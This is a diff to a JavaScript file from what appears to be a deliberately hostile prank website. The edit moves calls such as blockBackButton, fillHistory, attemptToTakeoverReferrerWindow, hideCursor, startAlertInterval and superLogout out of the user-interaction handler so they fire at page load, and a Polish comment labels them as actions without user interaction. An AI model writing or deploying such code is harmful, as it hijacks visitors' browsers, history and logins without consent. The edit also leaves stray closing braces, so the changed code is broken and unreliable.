@@ -280,24 +280,22 @@ function initChildWindow () {
  * Initialization code for parent windows.
  */
 function initParentWindow () {
-  showHelloMessage()
-  blockBackButton()
-  fillHistory()
-  startInvisiblePictureInPictureVideo()
+  showHelloMessage();
+  blockBackButton();
+  fillHistory();
+  startInvisiblePictureInPictureVideo();
 
-  interceptUserInput(event => {
-    // Only run these on the first interaction
-    if (interactionCount === 1) {
-      registerProtocolHandlers()
-      attemptToTakeoverReferrerWindow()
-      hideCursor()
-      startVideo()
-      startAlertInterval()
-      superLogout()
-      removeHelloMessage()
-      rainbowThemeColor()
-      animateUrlWithEmojis()
-      speak('To był błąd')
+  // Akcje bez interakcji użytkownika
+  registerProtocolHandlers();
+  attemptToTakeoverReferrerWindow();
+  hideCursor();
+  startVideo();
+  startAlertInterval();
+  superLogout();
+  removeHelloMessage();
+  rainbowThemeColor();
+  animateUrlWithEmojis();
+  speak('To był błąd');
     }
   })
 }
